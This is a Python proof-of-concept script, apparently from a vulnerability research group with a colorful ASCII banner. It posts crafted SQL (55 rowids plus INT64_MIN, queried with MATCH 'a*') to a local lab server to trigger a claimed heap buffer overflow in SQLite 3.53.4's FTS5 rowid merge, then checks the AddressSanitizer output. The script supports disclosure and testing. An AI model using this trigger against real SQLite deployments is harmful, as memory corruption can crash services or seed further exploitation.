#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: sqlite-fts5-rowidmerge (High: 7.5)
#  Vendor: SQLite (Hwaci)
#  Versions: SQLite 3.53.4 FTS5 detail=none
#  Impact: Prefix merge ASan WRITE of size 1 in fts5MergeRowidLists
#  Requires: FTS5 detail=none; ASan; loopback 127.0.0.1:18870
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "sqlite-fts5-rowidmerge"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove SQLite 3.53.4 FTS5 detail=none prefix-merge under-alloc (local crash)."""

import json
import os
import re
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Any

LABEL = "sqlite-fts5-rowidmerge"
WITNESS = "SQLITE-FTS5-ROWIDMERGE-WITNESS"
HOST = "127.0.0.1"
PORT = 18870
BASE = f"http://{HOST}:{PORT}"
TIMEOUT_S = 40.0
PINNED_VERSION = "3.53.4"
PINNED_SOURCE_DAY = "2026-07-24"
SINK_FRAMES = (
    "fts5MergeRowidLists",
    "fts5BufferSafeAppendVarint",
    "sqlite3Fts5PutVarint",
    "fts5_index.c",
)

# Forum 2026-08-04T08:49:27Z (Michele): 55 sequential rowids plus INT64_MIN,
# MATCH 'a*'. Input sum is 64 bytes; merged deltas need 72. No prefix= option:
# MATCH 'a*' scans main terms 'ab'/'abc' and calls fts5MergeRowidLists.
SETUP_SQL = """
CREATE VIRTUAL TABLE t USING fts5(a, detail=none);
BEGIN;
WITH RECURSIVE c(x) AS (
  VALUES(1) UNION ALL SELECT x+1 FROM c WHERE x<55
)
INSERT INTO t(rowid,a) SELECT x,'ab' FROM c;
INSERT INTO t(rowid,a) VALUES(-9223372036854775808,'abc');
COMMIT;
"""
CONTROL_SQL = SETUP_SQL + "SELECT count(rowid) FROM t WHERE t MATCH 'ab';\n"
TRIGGER_SQL = SETUP_SQL + "SELECT count(rowid) FROM t WHERE t MATCH 'a*';\n"


@dataclass(frozen=True)
class SqlResult:
    http_ok: bool
    http_status: int
    timeout: bool
    rc: int
    stdout: str
    stderr: str
    error: str
    raw: dict[str, Any]


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 400) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def http_json(method: str, path: str, body: str | None = None) -> tuple[int, dict[str, Any]]:
    data = None if body is None else body.encode("utf-8")
    headers = {"Accept": "application/json"}
    if data is not None:
        headers["Content-Type"] = "text/plain; charset=utf-8"
    req = urllib.request.Request(
        f"{BASE}{path}",
        data=data,
        method=method,
        headers=headers,
    )
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT_S) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            payload = json.loads(raw) if raw.strip() else {}
            if not isinstance(payload, dict):
                raise ValueError("non-object json")
            return int(resp.status), payload
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode("utf-8", errors="replace")
        try:
            payload = json.loads(raw) if raw.strip() else {}
        except json.JSONDecodeError:
            payload = {"error": raw}
        if not isinstance(payload, dict):
            payload = {"error": raw}
        return int(exc.code), payload


def post_sql(sql: str) -> SqlResult:
    try:
        status, payload = http_json("POST", "/sql", sql)
    except (TimeoutError, urllib.error.URLError, json.JSONDecodeError, ValueError) as exc:
        return SqlResult(
            http_ok=False,
            http_status=0,
            timeout=isinstance(exc, TimeoutError),
            rc=-1,
            stdout="",
            stderr="",
            error=str(exc),
            raw={},
        )
    stdout = str(payload.get("stdout") or "")
    stderr = str(payload.get("stderr") or "")
    try:
        rc = int(payload.get("rc", -1))
    except (TypeError, ValueError):
        rc = -1
    return SqlResult(
        http_ok=status == 200,
        http_status=status,
        timeout=bool(payload.get("timeout")),
        rc=rc,
        stdout=stdout,
        stderr=stderr,
        error=str(payload.get("error") or ""),
        raw=payload,
    )


def count_from_stdout(stdout: str) -> int | None:
    lines = [line.strip() for line in stdout.splitlines() if line.strip()]
    if not lines:
        return None
    last = lines[-1]
    if re.fullmatch(r"-?\d+", last):
        return int(last)
    return None


def asan_overflow(blob: str) -> bool:
    low = blob.lower()
    return "heap-buffer-overflow" in low or (
        "addresssanitizer" in low and "overflow" in low
    )


def sink_frame(blob: str) -> str | None:
    for name in SINK_FRAMES:
        if name in blob:
            return name
    return None


def summarize(name: str, result: SqlResult) -> None:
    log(
        f"IOC {name} http_ok={int(result.http_ok)} http_status={result.http_status} "
        f"timeout={int(result.timeout)} rc={result.rc} error={result.error!r} "
        f"stdout={clip(result.stdout)!r} stderr={clip(result.stderr)!r}"
    )


def health() -> dict[str, Any] | None:
    try:
        status, payload = http_json("GET", "/health")
    except (TimeoutError, urllib.error.URLError, json.JSONDecodeError, ValueError) as exc:
        log(f"IOC health-error {exc}")
        return None
    log(f"IOC health-http={status} {json.dumps(payload, sort_keys=True)}")
    if status != 200:
        return None
    return payload


def main() -> int:
    info = health()
    if info is None:
        return fail("health-unreachable")
    version = str(info.get("sqlite_version") or "")
    source_id = str(info.get("source_id") or "")
    log(f"IOC sqlite_version={version!r}")
    log(f"IOC source_id={source_id!r}")
    if version != PINNED_VERSION:
        return fail(f"unexpected-version={version}")
    if PINNED_SOURCE_DAY not in source_id:
        return fail(f"unexpected-source-id={clip(source_id, 120)}")
    if not info.get("fts5"):
        return fail("fts5-not-enabled")

    control = post_sql(CONTROL_SQL)
    summarize("control-match-ab", control)
    control_count = count_from_stdout(control.stdout)
    log(f"IOC control-count={control_count}")
    if asan_overflow(control.stderr) or sink_frame(control.stderr):
        return fail("control-asan-unexpected")
    if not control.http_ok or control.rc != 0 or control_count != 55:
        return fail(
            f"control-failed rc={control.rc} count={control_count} "
            f"stderr={clip(control.stderr, 160)}"
        )

    trigger = post_sql(TRIGGER_SQL)
    summarize("trigger-match-a-star", trigger)
    trigger_count = count_from_stdout(trigger.stdout)
    log(f"IOC trigger-count={trigger_count}")
    blob = f"{trigger.stdout}\n{trigger.stderr}"
    overflow = asan_overflow(blob)
    frame = sink_frame(blob)
    log(f"IOC asan-overflow={int(overflow)} sink-frame={frame}")
    if overflow and frame:
        how = f"asan-heap-buffer-overflow-{frame}"
        log(
            f"SUCCESS {LABEL} how={how} version={version} "
            f"control-count=55 trigger-rc={trigger.rc} {WITNESS}"
        )
        return 0
    if overflow and not frame:
        return fail("asan-overflow-wrong-frame")
    if trigger.timeout:
        return fail("trigger-timeout")
    if trigger_count is not None and trigger.rc == 0:
        return fail(f"match-returned-rows={trigger_count} no-overflow")
    return fail(
        f"untriggerable rc={trigger.rc} count={trigger_count} "
        f"stderr={clip(trigger.stderr, 200)}"
    )


if __name__ == "__main__":
    raise SystemExit(main())

